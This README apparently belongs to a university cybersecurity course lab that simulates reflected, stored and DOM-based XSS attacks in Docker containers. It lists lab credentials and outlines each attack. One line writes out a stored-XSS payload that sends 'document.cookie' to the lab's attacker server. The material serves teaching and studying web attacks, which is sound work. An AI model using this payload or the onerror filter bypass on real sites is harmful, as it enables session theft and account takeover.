# XSS Attack Simulation Environment

This repository contains a full implementation of Cross-Site Scripting (XSS) attack simulations developed for the 67607 Cybersecurity course[cite: 1, 3]. The project demonstrates the identification and exploitation of Reflected, Stored, and DOM-based XSS vulnerabilities within a Dockerized infrastructure.

---

## 🏗 Project Architecture

The environment consists of a Virtual Machine running four Docker containers connected via a virtual LAN named `xss-net`[cite: 15, 23]:



* **Web Server (`192.168.1.203`)**: Hosts the vulnerable PHP application[cite: 22].
* **Database (`192.168.1.204`)**: A MariaDB instance (v11.6.2) storing comments[cite: 22, 119].
* **Attacker Server (`192.168.1.201`)**: Receives exfiltrated cookies and spoofed data[cite: 22].
* **Attacker Client (`192.168.1.202`)**: Used to initiate attack payloads[cite: 22].

---

## 🔐 Credentials & Access

### Environment Access
* **VM Login**: `XSSEnv` / `5260` [cite: 20]
* **Host URL**: `http://localhost:8080` [cite: 25]

### Application Users
* **Victim**: `userlxss` / `xssExercise67607v` [cite: 73, 74]
* **Attacker**: `attacker` / `xssExercise67607a` [cite: 76, 77]

### Database Access
* **MariaDB User**: `u67607` / `courseUser` [cite: 115, 120]
* **Root Password**: `cours3Cyb3r!` [cite: 117]
* **Database Name**: `67607db` [cite: 118]

---

## 🚀 Attack Implementations

### 1. Reflected XSS
The vulnerability in `task1ref.php` incorporates unsanitized input from the `msg` URL parameter[cite: 93, 212].
* **Vector**: The payload is reflected back in the HTTP response but not stored[cite: 90].
* **Payload**: Uses `fetch()` to download `gradesPortal.php` and POSTs the content to the attacker's server[cite: 213, 224].
* **Output**: Raw HTML is saved as `spoofed-reflected.txt`[cite: 95].

### 2. Stored XSS
Injects a persistent script into the database via `task2stored.php`[cite: 104].
* **Payload**: `<script>fetch('http://192.168.1.201:44444/${document.cookie}')</script>`.
* **Execution**: When a victim visits `GradersPortalTask2.php`, the malicious code executes from the DB[cite: 104, 216].
* **Output**: The stolen session fetches the flag into `spoofed-stored.txt`[cite: 112, 221].

### 3. DOM-based XSS
Exploits insecure client-side DOM manipulation in `task3dom.php`[cite: 132, 217].
* **Vector**: Hidden in the URL fragment (`#`) to bypass server detection[cite: 218].
* **Bypass**: Uses an `<img>` tag with an `onerror` handler to circumvent modern browser script filters[cite: 219, 223].
* **Output**: Data is saved in `spoofed-dom.txt`[cite: 142].

---

## ⚙️ Compilation & Usage

### Compiling Code
Compile all C files inside the respective containers using[cite: 30, 167]:
```bash
gcc -Wall -Wextra -Werror -Wconversion program_name.c -o output_name

## Running the Attack

* **Start Services**: Use `docker start` for `vapp`, `mariadb-server`, `attacker-server`, and `attacker-client`[cite: 59, 61, 63, 67].
* **Establish Session**: You must log in as the victim at `login.php` before attempting attacks to generate a valid `PHPSESSID`[cite: 71, 78, 80].
* **Deploy**: Run the compiled binaries on the attacker server and navigate to the URLs provided in the `url_*.txt` files[cite: 30, 184, 189, 192].

---

## 📂 Repository Structure

* **ex3_reflected.c**: Attacker client code for the reflected attack[cite: 186, 187].
* **ex3_db_insert_stored.c**: C code for inserting the stored-XSS payload into the database[cite: 188].
* **ex3_stored.c**: Attacker server for stored cookie capture[cite: 190].
* **ex3_dom.c**: Attacker server for DOM-based attack capture[cite: 193].
* **url_*.txt**: Ready-to-use attack URLs with payloads[cite: 184, 185, 189, 191, 192].
* **explanation.txt**: Summary of attack logic and server construction[cite: 194, 195].
* **readme.txt**: Submitter IDs[cite: 196, 198].

---

**Course**: 67607 - XSS Attacks [cite: 1, 8]
**Authors**: 207807082, 209644251 [cite: 222]
